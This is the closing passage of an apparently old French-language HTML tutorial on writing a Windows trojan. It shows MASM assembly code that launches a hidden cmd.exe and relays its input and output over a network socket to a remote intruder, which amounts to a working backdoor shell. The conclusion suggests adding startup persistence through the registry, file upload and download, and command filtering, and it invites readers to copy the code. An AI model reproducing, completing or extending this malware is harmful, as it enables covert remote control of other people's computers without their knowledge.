+  <tt><font color="#CC00CC">mov starti.hStdOutput,eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#339933"> 
+  ; qui correspond &agrave; read_1</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#CC00CC">mov 
+  eax,read_2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#339933">; idem pour read_2</font></tt> <br>
+  <tt><font color="#CC00CC">mov starti.hStdInput,eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#339933">; STDIN de "cmd" correspondra &agrave; read_2</font></tt> 
+  </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#CC00CC">mov 
+  starti.dwFlags,STARTF_USESTDHANDLES+STARTF_USESHOWWINDOW </font><font color="#339933">;On 
+  prend en compte les</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#339933">;changements des fluxs standard</font></tt> <br>
+  <tt><font color="#CC00CC">mov starti.wShowWindow,SW_HIDE&nbsp; </font><font color="#339933">; 
+  Tant qu'&agrave; faire, on cache la fen&ecirc;tre de "cmd" ;))</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#CC00CC">&nbsp;invoke 
+  CreateProcess,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </font><font color="#339933">; 
+  CreateProcess (enfin)</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;&nbsp; ADDR cmd,&nbsp;</font><font color="#339933"> 
+  ; adresse de "cmd.exe"</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;&nbsp; NULL,&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#339933">&nbsp; 
+  ; pas de params pour cmd</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;&nbsp; ADDR secu, </font><font color="#339933">; 
+  security attributes</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;&nbsp; ADDR secu,</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;&nbsp; TRUE,&nbsp;&nbsp;&nbsp; </font><font color="#339933">; 
+  Handle inheritable</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;&nbsp; NULL,</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;&nbsp; NULL,</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;&nbsp; NULL,</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;&nbsp; ADDR starti, </font><font color="#339933">; 
+  STARTUPINFO&nbsp;&nbsp; (fen&ecirc;tre et STD*)</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;&nbsp; ADDR info&nbsp;&nbsp; </font><font color="#339933">; 
+  Structure de sortie (handle du process, mais on s'en tappe)</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#CC00CC">&nbsp;.if 
+  eax == NULL&nbsp; </font><font color="#339933">; on v&eacute;rifie si la fen&ecirc;tre 
+  est cr&eacute;&eacute;e</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;jmp die&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#339933">; sinon cr&ecirc;ve</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;.endif</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#CC00CC">invoke 
+  CloseHandle,read_2&nbsp;&nbsp; </font><font color="#339933">; on peut fermer 
+  2 handles d&eacute;sormais inutiles</font></tt> <br>
+  <tt><font color="#CC00CC">invoke CloseHandle,write_1</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#CC00CC">up:</font></tt> 
+  </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#339933">;PeekNamedPipe 
+  sert &agrave; determiner si il y a quelque chose &agrave; lire sur un pipe</font></tt> 
+  <br>
+  <tt><font color="#CC00CC">&nbsp;invoke PeekNamedPipe,read_1,NULL,NULL,NULL,ADDR 
+  byte_toread,NULL</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#CC00CC">&nbsp;.if 
+  byte_toread == NULL&nbsp;</font><font color="#339933">&nbsp; ; rien &agrave; 
+  lire sur read_1, cmd ne dit rien, on va donc voir</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;jmp get_text&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#339933">&nbsp; 
+  ; si l'utilisateur distant a tap&eacute; qqchose</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;.endif</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#CC00CC">&nbsp;invoke 
+  RtlZeroMemory,ADDR output,SIZEOF output&nbsp;&nbsp;</font><font color="#339933"> 
+  ; on sait jamais</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;invoke ReadFile,read_1,ADDR output,SIZEOF output,ADDR 
+  byte_read,NULL&nbsp; </font><font color="#339933">; on lit ce que cmd dit</font></tt> 
+  <br>
+  <tt><font color="#CC00CC">&nbsp;invoke send,socka,ADDR output,byte_read,NULL&nbsp;&nbsp; 
+  </font><font color="#339933">; on l'envoi sur la connexion</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;jmp up</font></tt> <br>
+  &nbsp; </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#CC00CC">get_text:</font></tt> 
+  </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#CC00CC">&nbsp;invoke 
+  RtlZeroMemory,ADDR input,SIZEOF input&nbsp;&nbsp;&nbsp;</font><font color="#339933">&nbsp; 
+  ; par pr&eacute;caution</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;invoke recv,socka,ADDR input,SIZEOF input,NULL&nbsp;&nbsp; 
+  </font><font color="#339933">; on recoit les donn&eacute;es de l'intru</font></tt> 
+  <br>
+  <tt><font color="#CC00CC">&nbsp;mov ebx,eax&nbsp;&nbsp;&nbsp; </font><font color="#339933">; 
+  eax contient le nombre d'octets lus, on sauve &ccedil;a dans ebx</font></tt> 
+  </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#CC00CC">&nbsp;invoke 
+  WriteFile,write_2,ADDR input,ebx,ADDR byte_read,NULL </font><font color="#339933">; 
+  On envoi la chaine &agrave; cmd</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#CC00CC">jmp 
+  up</font></tt> <br>
+  &nbsp; </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#CC00CC">die:&nbsp;&nbsp;</font><font color="#339933"> 
+  ; On ferme les sockets et on ret</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#CC00CC">&nbsp;invoke 
+  closesocket,sock</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;invoke closesocket,socka</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;ret</font></tt> <br>
+  &nbsp; </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#CC00CC">WinMain 
+  endp</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#CC00CC">end 
+  start</font></tt> </font>
+<p align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">------------------------------------------------- 
+  CUT HERE -----------------------------------------------------</font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Voila pour le code 
+  ! </font>
+<p> 
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><b><u>IV\ Conclusion</u></b> 
+  </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Ouf, voila :) <br>
+  Bien sur, ce programme est pas le must en mati&egrave;re de Trojan. <br>
+  Il resterai &agrave; faire une routine avec GetSystemDirectory ou un truc du 
+  genre pour d&eacute;terminer si on est sous NT ou win 9x (cmd.exe ou command.com 
+  ?) De m&ecirc;me pour faire un bon trojan on doit pouvoir downloader, uploader 
+  des fichiers, mais on peut toujours les copiers de l'interieur sur un repertoire 
+  accessible en FTP anonyme par exemple, enfin c'est pas le mieux. <br>
+  Il faudrait ne pas fermer le programme apr&egrave;s une seule connexion. Avec 
+  les fonctions RegOpenKey etc... on pourrais faire en sorte que le programme 
+  se lance automatiquement au d&eacute;marrage en ajoutant une cl&eacute; dans 
+  D&eacute;marrage, ou un truc comme &ccedil;a. <br>
+  On peut aussi filtrer ce que l'utilisateur distant tappe, afin de determiner 
+  des commandes, pour cr&eacute;&eacute; des cl&eacute;s dans la base de registre, 
+  ou pour uploader des fichiers, ou m&ecirc;me pour envoyer des MessageBox &agrave; 
+  l'utilisateur local :) J'imagine que vous avez assez d'imagination alors......... 
+  Au fait, vous pouvez copier le code du prog, vous pouvez plagier &agrave; 98% 
+  mon article, MAIS VOUS METTEZ MON NOM ! Dans un coin si vous voulez, mais je 
+  veux l'y voir ! Merci. Je me suis inspir&eacute; l&eacute;g&egrave;rement pour 
+  cet article d'un extrait de phrack, ou il &eacute;tait question de spawner un 
+  shell avec les Pipes pour un code de bof. <br>
+  Bon courage, et merci encore de m'avoir lu ! H&eacute;sitez pas &agrave; me 
+  poser des questions, je suis sur Undernet :&nbsp; #securiweb ou #tipiak.Ou tout 
+  simplement, <a href="mailto:Obscurer@tipiak.net">mailez-moi</a>.</font>
+</body>
+</html>
